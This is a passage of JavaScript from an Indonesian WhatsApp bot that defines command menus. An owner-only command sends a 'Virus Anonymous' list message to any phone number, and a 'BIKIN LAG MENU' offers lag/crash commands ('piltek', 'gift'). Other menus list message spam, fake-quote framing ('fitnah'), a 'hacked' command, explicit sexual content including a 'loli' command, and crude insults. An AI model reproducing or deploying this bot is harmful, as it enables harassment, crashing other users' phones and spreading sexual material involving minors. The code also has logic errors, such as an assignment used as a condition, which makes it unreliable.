      if (!isOwner && !mek.key.fromMe) return reply(`Khusus Owner Om`)
listMsg = {
 buttonText: `serah lu dah kalo ngeyel`,
 footerText: '',
 description: `JANGAN DIBUKA`,
 sections: [
                     {
                      "title": `Bagaimana hadiahnya?`,
 rows: [{
"title": `${emoji1(prefix)}`,
"description": 'Virus Anonymous',
"rowId": "/menu"
}]
                     }],
 listType: 1,
 ListMessageListType: 2
}
if (!args[0]) {
Fan.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}})
} else {
  Fan.sendMessage(`${args[0]}@s.whatsapp.net`, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]}})
}
            break
            case 'quotes':
            
     reply(ini_txt)
     break
     case 'menu':
menu = `Hay Kak ${pushname}🐦
┏━➤ *INFO BOT* 
*┣┃* ✢Creator : 𝐅𝐚𝐧 𝐗7
*┃┃* ✢Status : ${isOwner ? 'Owner' : 'User'}
*┃┃* ✢Nama Bot : ${NamaBot}
*┃┃* ✢Prefix : Multi Prefix
*┃┃* ✢Baterai : ${baterai}%
*┃┃* ✢Speed : ${latensyi.toFixed(4)} DETIK
*┃┃* ✢Language : Javascript
*┃┗━━━━━━━━*
*┃➳ Thanks To Allah S.W.T*
*┃➳ Thank To Ortu*
*┃➳ Thank To Zero YT7*
*┃➳ Thank To zeeone ofc*
*┃➳ Thank To KurrXD*
*┃➳ Thank To Herman Channel*
*┃➳ Thank To DEFFBOTZZ*
*┃➳ Thank To Fan X7*
*┃➳ Thanks To All Creator BOTz*
*┗━━━━━━━ •*`
img = fs.readFileSync('./P3/image/logonya2.jpeg')
trans = `Dilarang Spam Bot!! Jeda Minimal 5detik Spam/Call Auto Baned!.Mohon Hargai Creator Bot\nRuntime : ${waktu(runtime)}`
but = [
          { buttonId: `${prefix}allmenu`, buttonText: { displayText: 'ALLMENU' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 },
      ]                        
        sendButImage(from, menu, trans, img, but, {quoted: ftrol})
menu = fs.readFileSync('./P3/vn/menu.mp3')
         Fan.sendMessage(from, menu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break

case 'allmenu':
        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
                
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ 𝐎𝐖𝐍𝐄𝐑*  

ダ ${prefix}autorespon [ on/off ]
ダ ${prefix}bc
ダ ${prefix}tobc [ reply sticker/audio with caption ]
ダ ${prefix}return [ javascript ]
ダ ${prefix}delchat
ダ ${prefix}mute
ダ ${prefix}unmute
ダ ${prefix}public
ダ ${prefix}self
ダ ${prefix}spam [ teks|jumlah ]
ダ ${prefix}demoteall
ダ ${prefix}promoteall
ダ ${prefix}addcmd [ teks reply stc ]
ダ ${prefix}delcmd [ reply stc ]
ダ ${prefix}listcmd
ダ ${prefix}spamsw [ teks|jumlah ]
ダ ${prefix}upswteks [ teks ]
ダ ${prefix}upswlokasi [ teks ]
ダ ${prefix}upswaudio [ reply audio ]
ダ ${prefix}upswvoice [ reply audio ]
ダ ${prefix}upswsticker [ reply sticker ]
ダ ${prefix}upswimage [ reply image with caption ]
ダ ${prefix}upswgif [ reply gif with caption ]
ダ ${prefix}upswvideo [ reply video with caption ]
ダ ${prefix}shutdown
ダ ${prefix}offline [ alasan ]
ダ ${prefix}online
ダ ${prefix}exif [ nama|author ]
ダ ${prefix}setprofile [ reply image ]
ダ ${prefix}setname [ teks ]
ダ ${prefix}setprefix [ multi/nopref/prefix ]
ダ ${prefix}setbio [ teks ]
ダ ${prefix}leave
ダ ${prefix}restart
ダ ${prefix}addrespon [ tanya|jawab ]
ダ ${prefix}delrespon [ nama ]
ダ ${prefix}listrespon
ダ ${prefix}readall
ダ ${prefix}unreadall
ダ ${prefix}archive
ダ ${prefix}unarchiveall
ダ ${prefix}pin
ダ ${prefix}unpin
ダ ${prefix}setmenu [ ori/simpel ]
ダ ${prefix}setallmenu [ ori/simpel ]
ダ ${prefix}leavetime [ detik/menit/jam ]
ダ ${prefix}bukatime [ detik/menit/jam ]
ダ ${prefix}tutuptime [ detik/menit/jam ]
ダ ${prefix}nano [ nama file ]


*─❒ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔*  

ダ ${prefix}getpict [ @tag ]
ダ ${prefix}getname [ reply target ]
ダ ${prefix}getbio [ reply target ]
ダ ${prefix}promote [ @tag ]
ダ ${prefix}demote [ @tag ]
ダ ${prefix}antilink [ on/off ]
ダ ${prefix}antivirtex [ on/off ]
ダ ${prefix}welcome [ on/off ]
ダ ${prefix}creategrup [ nama|@tag ]
ダ ${prefix}tictactoe [ @tag ]
ダ ${prefix}delttt
ダ ${prefix}kick
ダ ${prefix}add
ダ ${prefix}getpp
ダ ${prefix}getdeskgc
ダ ${prefix}sider [ reply pesan bot ]
ダ ${prefix}hacked [ teks ]
ダ ${prefix}setnamegc [ teks ]
ダ ${prefix}setdeskgc [ teks ]
ダ ${prefix}fitnah [ @tag|teks1|teks2 ]
ダ ${prefix}kontak [ @tag|nama ]
ダ ${prefix}kontag [ @tag|nama ]
ダ ${prefix}opengc
ダ ${prefix}closegc
ダ ${prefix}resetlinkgc
ダ ${prefix}linkgrup
ダ ${prefix}hidetag [ teks ]
ダ ${prefix}tagall
ダ ${prefix}sticktag [ nama sticker ]
ダ ${prefix}totag [ reply media ]        


*─❒ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃*  

ダ ${prefix}wallml
ダ ${prefix}pinterest
ダ ${prefix}herolist
ダ ${prefix}herodetail [ hero ]
ダ ${prefix}google [ search ]
ダ ${prefix}gimage [ search ]
ダ ${prefix}wiki [ _search_ ]
ダ ${prefix}mediafire [ link ]
ダ ${prefix}ytsearch [ judul ]
ダ ${prefix}ytmp4 [ link yt ]
ダ ${prefix}ytmp3 [ link yt ]
ダ ${prefix}play [ judul lagu ]
ダ ${prefix}video [ judul video ]
ダ ${prefix}tinyurl [ link ]
ダ ${prefix}fetch [ link ]
ダ ${prefix}igdl [ link ]
ダ ${prefix}tiktokdl [ link ]
ダ ${prefix}pinterest [ search ]
ダ ${prefix}lirik [ judul ]
ダ ${prefix}tourl [ reply image/video ]
ダ ${prefix}kalkulator [ angka ]
ダ ${prefix}translate [ teks kodebhs ]
ダ ${prefix}ss [ link ]
ダ ${prefix}playstore [ search ]
ダ ${prefix}tiktokaudio [ link ]
ダ ${prefix}brainly [ search ]
ダ ${prefix}igstory [ search ]
ダ ${prefix}igstalk [ link ]
ダ ${prefix}twitter [ link ]
ダ ${prefix}twmp3 [ link ]
ダ ${prefix}linkwa [ search ]
ダ ${prefix}chara [ search ]
ダ ${prefix}otaku [ search ]
ダ ${prefix}komiku [ search ]        


*─❒ 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔*  

ダ ${prefix}popo
ダ ${prefix}bego
ダ ${prefix}tolol
ダ ${prefix}pinter
ダ ${prefix}pintar
ダ ${prefix}asu
ダ ${prefix}bodoh
ダ ${prefix}gay
ダ ${prefix}lesby
ダ ${prefix}bajingan
ダ ${prefix}jancok
ダ ${prefix}anjing
ダ ${prefix}ngentod
ダ ${prefix}ngentot
ダ ${prefix}monyet
ダ ${prefix}mastah
ダ ${prefix}newbie
ダ ${prefix}bangsat
ダ ${prefix}bangke
ダ ${prefix}sange
ダ ${prefix}sangean
ダ ${prefix}dakjal
ダ ${prefix}horny
ダ ${prefix}wibu
ダ ${prefix}puki
ダ ${prefix}pantex


*─❒ 𝐌𝐀𝐊𝐄𝐑 𝐌𝐄𝐍𝐔*  

ダ ${prefix}terbaikmaker [ teks/teks2 ]
ダ ${prefix}bengekmaker [ teks/teks2 ]
ダ ${prefix}memekertas [ teksnya ]
ダ ${prefix}blackpink [ teksnya ]
ダ ${prefix}neon [ teksnya ]
ダ ${prefix}greenneon [ teksnya ]
ダ ${prefix}advanceglow [ teksnya ]
ダ ${prefix}futureneon [ teksnya ]
ダ ${prefix}sandwriting [ teksnya ]
ダ ${prefix}sandsummer [ teksnya ]
ダ ${prefix}sandengraved [ teksnya ]
ダ ${prefix}metaldark [ teksnya ]
ダ ${prefix}neonlight [ teksnya ]
ダ ${prefix}holographic [ teksnya ]
ダ ${prefix}text1917 [ teksnya ]
ダ ${prefix}minion [ teksnya ]
ダ ${prefix}deluxesilver [ teksnya ]
ダ ${prefix}newyearcard [ teksnya ]
ダ ${prefix}bloodfrosted [ teksnya ]
ダ ${prefix}halloween [ teksnya ]
ダ ${prefix}jokerlogo [ teksnya ]
ダ ${prefix}fireworksparkle [ teksnya ]
ダ ${prefix}natureleaves [ teksnya ]
ダ ${prefix}bokeh [ teksnya ]
ダ ${prefix}toxic [ teksnya ]
ダ ${prefix}strawberry [ teksnya ]
ダ ${prefix}box3d [ teksnya ]
ダ ${prefix}roadwarning [ teksnya ]
ダ ${prefix}breakwall [ teksnya ]
ダ ${prefix}icecold [ teksnya ]
ダ ${prefix}luxury [ teksnya ]
ダ ${prefix}cloud [ teksnya ]
ダ ${prefix}summersand [ teksnya ]
ダ ${prefix}horrorblood [ teksnya ]
ダ ${prefix}thunder [ teksnya ]
ダ ${prefix}pornhub [ teksnya ]
ダ ${prefix}glitch [ teksnya ]
ダ ${prefix}avenger [ teksnya ]
ダ ${prefix}space [ teksnya ]
ダ ${prefix}ninjalogo [ teksnya ]
ダ ${prefix}marvelstudio [ teksnya ]
ダ ${prefix}lionlogo [ teksnya ]
ダ ${prefix}wolflogo [ teksnya ]
ダ ${prefix}steel3d [ teksnya ]
ダ ${prefix}wallgravity [ teksnya ]
ダ ${prefix}shadow [ teksnya ]
ダ ${prefix}cup [ teksnya ]
ダ ${prefix}cup1 [ teksnya ]
ダ ${prefix}romance [ teksnya ]
ダ ${prefix}smoke [ teksnya ]
ダ ${prefix}burnpaper [ teksnya ]
ダ ${prefix}lovemessage [ teksnya ]
ダ ${prefix}undergrass [ teksnya ]
ダ ${prefix}love [ teksnya ]
ダ ${prefix}coffe [ teksnya ]
ダ ${prefix}woodheart [ teksnya ]
ダ ${prefix}woodenboard [ teksnya ]
ダ ${prefix}summer3d [ teksnya ]
ダ ${prefix}wolfmetal [ teksnya ]
ダ ${prefix}nature3d [ teksnya ]
ダ ${prefix}underwater [ teksnya ]
ダ ${prefix}golderrose [ teksnya ]
ダ ${prefix}summernature [ teksnya ]
ダ ${prefix}letterleaves [ teksnya ]
ダ ${prefix}glowingneon [ teksnya ]
ダ ${prefix}fallleaves [ teksnya ]
ダ ${prefix}flamming [ teksnya ]
ダ ${prefix}harrypotter [ teksnya ]
ダ ${prefix}carvedwood [ teksnya ]
ダ ${prefix}arcade8bit [ teksnya ]
ダ ${prefix}battlefield4 [ teksnya ]
ダ ${prefix}pubg [ teksnya ]
ダ ${prefix}wetglass [ teksnya ]
ダ ${prefix}multicolor3d [ teksnya ]
ダ ${prefix}watercolor [ teksnya ]
ダ ${prefix}luxurygold [ teksnya ]
ダ ${prefix}galaxywallpaper [ teksnya ]
ダ ${prefix}lighttext [ teksnya ]
ダ ${prefix}beautifulflower [ teksnya ]
ダ ${prefix}puppycute [ teksnya ]
ダ ${prefix}royaltext [ teksnya ]
ダ ${prefix}birthdaycake [ teksnya ]
ダ ${prefix}galaxystyle [ teksnya ]
ダ ${prefix}hologram3d [ teksnya ]
ダ ${prefix}greenneon [ teksnya ]
ダ ${prefix}glossychrome [ teksnya ]
ダ ${prefix}greenbush [ teksnya ]
ダ ${prefix}metallogo [ teksnya ]
ダ ${prefix}noeltext [ teksnya ]
ダ ${prefix}glittergold [ teksnya ]
ダ ${prefix}textcake [ teksnya ]
ダ ${prefix}starsnight [ teksnya ]
ダ ${prefix}wooden3d [ teksnya ]
ダ ${prefix}textbyname [ teksnya ]
ダ ${prefix}writegalacy [ teksnya ]
ダ ${prefix}galaxybat [ teksnya ] 
ダ ${prefix}snow3d [ teksnya ]
ダ ${prefix}birthdayday [ teksnya ]
ダ ${prefix}goldplaybutton [ teksnya ]
ダ ${prefix}silverplaybutton [ teksnya ]
ダ ${prefix}freefire [ teksnya ]
ダ ${prefix}shadow [ teksnya ]


*─❒ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔* 

ダ ${prefix}nulis teksnya
ダ ${prefix}sticker
ダ ${prefix}stickertelegram [ NAMA STICKER ]
ダ ${prefix}stickerwm [ nama|author ]
ダ ${prefix}dadu
ダ ${prefix}semoji [ emoji ]
ダ ${prefix}attp [ teks ]
ダ ${prefix}ttp [ teks ]
ダ ${prefix}ttp2 [ teks ]
ダ ${prefix}ttp3 [ teks ]
ダ ${prefix}ttp4 [ teks ]
ダ ${prefix}toimg
ダ ${prefix}togif [ reply sticker gif ]
ダ ${prefix}robot [ reply audio ]
ダ ${prefix}balik [ reply audio ]
ダ ${prefix}bass [ reply audio ]
ダ ${prefix}gemuk [ reply audio ]
ダ ${prefix}detikvn [ reply audio caption angka ]
ダ ${prefix}detikvideo [ reply video caption angka ] 
ダ

*─❒ 𝐖𝐈𝐁𝐔 𝐌𝐄𝐍𝐔*  

ダ ${prefix}zoro
ダ ${prefix}luffy
ダ ${prefix}sanji
ダ ${prefix}ussop
ダ ${prefix}nami
ダ ${prefix}copper
ダ ${prefix}naruto
ダ ${prefix}minato 
ダ ${prefix}sasuke 
ダ ${prefix}sakura
ダ ${prefix}boruto
ダ ${prefix}sarada 
ダ ${prefix}mitsuki 
ダ ${prefix}orochimaru 
ダ ${prefix}tsunade
ダ ${prefix}kakashi 
ダ ${prefix}killua
ダ ${prefix}gon 
ダ ${prefix}saitama
ダ ${prefix}rimuru 
ダ ${prefix}natsu 
ダ ${prefix}tanjirou
ダ ${prefix}nezuko 
ダ ${prefix}senku   
ダ ${prefix}loli
ダ ${prefix}husbu
ダ ${prefix}milf
ダ ${prefix}cosplay  


*─❒ 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔*  

ダ ${prefix}cogan
ダ ${prefix}cecan
ダ ${prefix}meme
ダ ${prefix}darkjoke
ダ ${prefix}memeindo
ダ ${prefix}asupan
ダ ${prefix}quotes
ダ ${prefix}rate
ダ ${prefix}kapankah
ダ ${prefix}apakah
ダ ${prefix}bisakah
ダ ${prefix}caripesan [ teks|jumlah ]
ダ ${prefix}slots
ダ ${prefix}suit [ gunting/batu/kertas ]
ダ ${prefix}tag [ nomor ]
ダ ${prefix}tagme
ダ ${prefix}tts [ kodebhs teks ]
ダ ${prefix}readmore [ teks1|teks2 ]
ダ ${prefix}fitnahpc [ nomor|teks1|teks2 ]
ダ ${prefix}chat [ nomor|teks ]
ダ ${prefix}fdeface [ replyimg link|teks1|teks2 ]
ダ ${prefix}listgrup
ダ ${prefix}baileys [ reply message ]
ダ ${prefix}q [ reply message ]
ダ ${prefix}getcaption [ reply message ]
ダ ${prefix}tospam [ reply audio/sticker/image|jumlah ]
ダ ${prefix}sharelock [ teks1|teks2 ]


*─❒ 𝐉𝐀𝐃𝐈 𝐁𝐎𝐓*   

ダ ${prefix}jadibot
ダ ${prefix}stopjadibot


*─❒ 𝐒𝐎𝐔𝐍𝐃 𝐌𝐄𝐍𝐔*  

ダ ${prefix}sound1
ダ ${prefix}sound2
ダ ${prefix}sound3
ダ ${prefix}sound4
ダ ${prefix}sound5
ダ ${prefix}sound6
ダ ${prefix}sound7
ダ ${prefix}sound8
ダ ${prefix}sound9
ダ ${prefix}sound10
ダ ${prefix}sound11
ダ ${prefix}sound12
ダ ${prefix}sound13
ダ ${prefix}sound14
ダ ${prefix}sound15
ダ ${prefix}sound16
ダ ${prefix}sound17
ダ ${prefix}sound18
ダ ${prefix}sound19
ダ ${prefix}sound20
ダ ${prefix}sound21
ダ ${prefix}sound22
ダ ${prefix}sound23
ダ ${prefix}sound24
ダ ${prefix}sound25
ダ ${prefix}sound26     
ダ ${prefix}sound27
ダ ${prefix}sound28
ダ ${prefix}sound29
ダ ${prefix}sound30
ダ ${prefix}sound31
ダ ${prefix}sound32
ダ ${prefix}sound33
ダ ${prefix}sound34
ダ ${prefix}sound35
ダ ${prefix}sound36
ダ ${prefix}sound37
ダ ${prefix}sound38
ダ ${prefix}sound39
ダ ${prefix}sound40
ダ ${prefix}sound41
ダ ${prefix}sound42
ダ ${prefix}sound43
ダ ${prefix}sound44
ダ ${prefix}sound45
ダ ${prefix}sound46
ダ ${prefix}sound47
ダ ${prefix}sound48
ダ ${prefix}sound49
ダ ${prefix}sound50
ダ ${prefix}sound51
ダ ${prefix}sound52
ダ ${prefix}sound53
ダ ${prefix}sound54
ダ ${prefix}sound55
ダ ${prefix}sound56
ダ ${prefix}sound57
ダ ${prefix}sound58
ダ ${prefix}sound59
ダ ${prefix}sound60
ダ ${prefix}sound61
ダ ${prefix}sound62
ダ ${prefix}sound63
ダ ${prefix}sound64
ダ ${prefix}sound65
ダ ${prefix}sound66
ダ ${prefix}sound67
ダ ${prefix}sound68
ダ ${prefix}sound69
ダ ${prefix}sound70
ダ ${prefix}sound71
ダ ${prefix}sound72
ダ ${prefix}sound73
ダ ${prefix}sound74
ダ ${prefix}sound75
ダ ${prefix}sound76
ダ ${prefix}sound77
ダ ${prefix}sound78
ダ ${prefix}sound79
ダ ${prefix}sound80
ダ ${prefix}sound81
ダ ${prefix}sound82
ダ ${prefix}sound83
ダ ${prefix}sound84
ダ ${prefix}sound85
ダ ${prefix}sound86
ダ ${prefix}sound87
ダ ${prefix}sound88
ダ ${prefix}sound89
ダ ${prefix}sound90
ダ ${prefix}sound91
ダ ${prefix}sound92
ダ ${prefix}sound93
ダ ${prefix}sound94
ダ ${prefix}sound95
ダ ${prefix}sound96
ダ ${prefix}sound97
ダ ${prefix}sound98
ダ ${prefix}sound99
ダ ${prefix}sound100


*─❒ 𝐒𝐓𝐎𝐑𝐀𝐆𝐄 𝐌𝐄𝐍𝐔*  

ダ ${prefix}listimage
ダ ${prefix}liststicker
ダ ${prefix}listvn
ダ ${prefix}addsticker [ nama ]
ダ ${prefix}delsticker [ nama ]
ダ ${prefix}addvn [ nama ]
ダ ${prefix}delvn [ nama ]
ダ ${prefix}addimage [ nama ]
ダ ${prefix}delimage [ nama ]  


*─❒ 𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔*  

ダ ${prefix}tebakgambar
ダ ${prefix}caklontong 


*─❒ 𝐇𝐀𝐑𝐀𝐌 𝐌𝐄𝐍𝐔* 

ダ ${prefix}bokep
ダ ${prefix}neko
ダ ${prefix}kanna
ダ ${prefix}sagiri
ダ ${prefix}megumin
ダ ${prefix}wallnime
ダ ${prefix}ass
ダ ${prefix}ahegao
ダ ${prefix}hentai
ダ ${prefix}yuri
ダ ${prefix}panties
ダ ${prefix}neko
ダ ${prefix}chiisaihentai
ダ ${prefix}trap
ダ ${prefix}blowjob
ダ ${prefix}yaoi
ダ ${prefix}ecchi
ダ ${prefix}ahegao
ダ ${prefix}hololewd
ダ ${prefix}sideoppai
ダ ${prefix}animefeets
ダ ${prefix}animebooty
ダ ${prefix}animethighss
ダ ${prefix}hentaiparadise
ダ ${prefix}animearmpits
ダ ${prefix}hentaifemdom
ダ ${prefix}lewdanimegirls
ダ ${prefix}biganimetiddies
ダ ${prefix}animebellybutton
ダ ${prefix}hentai4everyone
ダ ${prefix}bj
ダ ${prefix}ero
ダ ${prefix}cum
ダ ${prefix}feet
ダ ${prefix}yuri
ダ ${prefix}trap
ダ ${prefix}lewd
ダ ${prefix}feed
ダ ${prefix}eron
ダ ${prefix}solo
ダ ${prefix}gasm
ダ ${prefix}poke
ダ ${prefix}anal
ダ ${prefix}holo
ダ ${prefix}tits
ダ ${prefix}kuni
ダ ${prefix}kiss
ダ ${prefix}erok
ダ ${prefix}smug
ダ ${prefix}baka
ダ ${prefix}solog
ダ ${prefix}feetg
ダ ${prefix}lewdk
ダ ${prefix}waifu
ダ ${prefix}pussy
ダ ${prefix}femdom
ダ ${prefix}cuddle
ダ ${prefix}eroyuri
ダ ${prefix}cum [ jpg ]
ダ ${prefix}blowjob
ダ ${prefix}erofeet
ダ ${prefix}holoero
ダ ${prefix}classic
ダ ${prefix}erokemo
ダ ${prefix}fox [ girl ]
ダ ${prefix}futanari
ダ ${prefix}lewdkemo
ダ ${prefix}wallpaper
ダ ${prefix}kemonomimi
ダ ${prefix}nsfw [ avatar ]  


*─❒ 𝐒𝐈𝐌𝐏𝐄𝐋*  

ダ ${prefix}ownermenu            
ダ ${prefix}groupmenu
ダ ${prefix}funmenu
ダ ${prefix}soundmenu
ダ ${prefix}downloadmenu
ダ ${prefix}makermenu
ダ ${prefix}storagemenu
ダ ${prefix}toolsmenu
ダ ${prefix}wibumenu
ダ ${prefix}harammenu
ダ ${prefix}gamemenu
ダ ${prefix}othermenu


*─❒ 𝐋𝐀𝐈𝐍𝐍𝐘𝐀*  

ダ ${prefix}info
ダ ${prefix}store
ダ ${prefix}owner
ダ ${prefix}runtime
ダ ${prefix}speed
ダ ${prefix}sc
ダ ${prefix}grup [ GRUP OFFICIAL BOT ]       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`Fan X7`,buttonText:{displayText:'Okey\nAku Aku Mau Kasih Tau Kalo Ibu Ku Adalah Lonte😏'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
        




case 'ownermenu':
  if (!isOwner && !mek.key.fromMe) return reply(`KHUSUS OWNER`)
        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
                
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ OWNER MENU*
_ダ ${prefix}autorespon [ _on/off_ ]_
_ダ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]_
_ダ ${prefix}tobc [ _reply sticker/audio with caption_ ]_
_ダ ${prefix}return [ _javascript_ ]_
_ダ ${prefix}delchat_
_ダ ${prefix}mute_
_ダ ${prefix}unmute_
_ダ ${prefix}public_
_ダ ${prefix}self_
_ダ ${prefix}spam [ _teks|jumlah_ ]_
_ダ ${prefix}demoteall_
_ダ ${prefix}promoteall_
_ダ ${prefix}addcmd [ _teks reply stc_ ]_
_ダ ${prefix}delcmd [ _reply stc_ ]_
_ダ ${prefix}listcmd_
_ダ ${prefix}spamsw [ _teks|jumlah_ ]_
_ダ ${prefix}upswteks [ _teks_ ]_
_ダ ${prefix}upswlokasi [ _teks_ ]_
_ダ ${prefix}upswaudio [ _reply audio_ ]_
_ダ ${prefix}upswvoice [ _reply audio_ ]_
_ダ ${prefix}upswsticker [ _reply sticker_ ]_
_ダ ${prefix}upswimage [ _reply image with caption_ ]_
_ダ ${prefix}upswgif [ _reply gif with caption_ ]_
_ダ ${prefix}upswvideo [ _reply video with caption_ ]_
_ダ ${prefix}shutdown_
_ダ ${prefix}offline [ _alasan_ ]_
_ダ ${prefix}online_
_ダ ${prefix}exif [ _nama|author_ ]_
_ダ ${prefix}setprofile [ _reply image_ ]_
_ダ ${prefix}setname [ _teks_ ]
_ダ ${prefix}setprefix [ _multi/nopref/prefix_ ]_
_ダ ${prefix}setbio [ _teks_ ]_
_ダ ${prefix}leave_
_ダ ${prefix}restart_
_ダ ${prefix}addrespon [ _tanya|jawab_ ]_
_ダ ${prefix}delrespon [ _nama_ ]_
_ダ ${prefix}listrespon_
_ダ ${prefix}readall_
_ダ ${prefix}unreadall_
_ダ ${prefix}archive_
_ダ ${prefix}unarchiveall_
_ダ ${prefix}pin_
_ダ ${prefix}unpin_
_ダ ${prefix}setmenu [ _ori/simpel_ ]_
_ダ ${prefix}setallmenu [ _ori/simpel_ ]_
_ダ ${prefix}leavetime [ _detik/menit/jam_ ]_
_ダ ${prefix}bukatime [ _detik/menit/jam_ ]_
_ダ ${prefix}tutuptime [ _detik/menit/jam_ ]_
_ダ ${prefix}nano [ _nama file_ ]_             
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break

case 'blmmenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ BIKIN LAG MENU (khusus owner)*
_ダ ${prefix}piltek_
_ダ ${prefix}gift_               
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'groupmenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*──❒ GROUP MENU*
_ダ ${prefix}getpict [ _@tag_ ]_
_ダ ${prefix}getname [ _reply target_ ]_
_ダ ${prefix}getbio [ _reply target_ ]_
_ダ ${prefix}promote [ _@tag_ ]_
_ダ ${prefix}demote [ _@tag_ ]_
_ダ ${prefix}antilink [ _on/off_ ]_
_ダ ${prefix}antivirtex [ _on/off_ ]_
_ダ ${prefix} welcome [ _on/off_ ]_____
_ダ ${prefix}creategrup [ _nama|@ta___g_ ]
_ダ ${prefix}tictactoe [ _@tag_ ]_
_ダ ${prefix}delttt_
_ダ ${prefix}kick_
_ダ ${prefix}add_
_ダ ${prefix}getpp_
_ダ ${prefix}getdeskgc_
_ダ ${prefix}sider [ _reply pesan bot_ ]_
_ダ ${prefix}hacked [ _teks_ ]_
_ダ ${prefix}setnamegc [ _teks_ ]_
_ダ ${prefix}setdeskgc [ _teks_ ]_
_ダ ${prefix}fitnah [ _@tag|teks1|teks2_ ]_
_ダ ${prefix}kontak [ _@tag|nama_ ]_
_ダ ${prefix}kontag [ _@tag|nama_ ]_
_ダ ${prefix}opengc_
_ダ ${prefix}closegc_
_ダ ${prefix}resetlinkgc_
_ダ ${prefix}linkgrup_
_ダ ${prefix}hidetag [ _teks_ ]_
